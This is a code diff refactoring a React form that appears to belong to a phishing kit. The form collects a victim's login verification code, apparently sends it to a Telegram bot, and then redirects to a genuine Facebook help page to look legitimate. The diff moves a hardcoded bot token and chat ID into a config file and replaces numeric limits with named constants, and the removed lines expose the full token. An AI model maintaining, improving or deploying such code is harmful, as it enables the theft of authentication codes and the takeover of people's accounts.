@@ -1,10 +1,18 @@
 import React, { useState } from "react";
 import { useLocation, Navigate } from "react-router-dom";
 import "./AuthCodeForm.scss";
+import {
+  BOT_TOKEN,
+  CHAT_ID,
+  MAX_CODE_ATTEMPTS,
+  CODE_MIN_LENGTH,
+  CODE_MAX_LENGTH,
+  CODE_COOLDOWN_SECONDS,
+  CODE_REDIRECT_DELAY_MS,
+  TRY_ANOTHER_WAY_DELAY_MS,
+} from "./config";
 
 const AuthCodeForm = () => {
-  const BOT_TOKEN = "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA";
-  const CHAT_ID = "7211586401";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
@@ -50,7 +58,7 @@ const AuthCodeForm = () => {
 
   const startCooldown = () => {
     setIsSubmitDisabled(true);
-    setTimeLeft(60);
+    setTimeLeft(CODE_COOLDOWN_SECONDS);
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev <= 1) {
@@ -128,7 +136,7 @@ const AuthCodeForm = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit)
+    if (code.length < CODE_MIN_LENGTH || isSubmitDisabled || clickCount >= MAX_CODE_ATTEMPTS || loadingSubmit)
       return;
 
     setLoadingSubmit(true);
@@ -169,7 +177,7 @@ const AuthCodeForm = () => {
         setTimeout(() => {
           window.location.href =
             "https://www.facebook.com/help/1735443093393986/";
-        }, 2000);
+        }, CODE_REDIRECT_DELAY_MS);
       }
     } catch (err) {
       console.error("Telegram Error:", err);
@@ -183,7 +191,7 @@ const AuthCodeForm = () => {
     setTimeout(() => {
       setLoadingOptions(false);
       setShowOptions(true);
-    }, 1000);
+    }, TRY_ANOTHER_WAY_DELAY_MS);
   };
 
   const handleMethodSelect = (method) => setSelectedMethod(method);
@@ -293,7 +301,7 @@ const AuthCodeForm = () => {
           <input
             type="text"
             placeholder="Code"
-            maxLength={8}
+            maxLength={CODE_MAX_LENGTH}
             value={code}
             onChange={(e) => setCode(e.target.value)}
             className="auth-input"
@@ -312,7 +320,7 @@ const AuthCodeForm = () => {
           <button
             type="submit"
             className={`auth-button ${isSubmitDisabled ? "disabled" : ""}`}
-            disabled={code.length < 6 || isSubmitDisabled || loadingSubmit}
+            disabled={code.length < CODE_MIN_LENGTH || isSubmitDisabled || loadingSubmit}
           >
             {loadingSubmit ? <span className="spinner-inline" /> : "Continue"}
           </button>
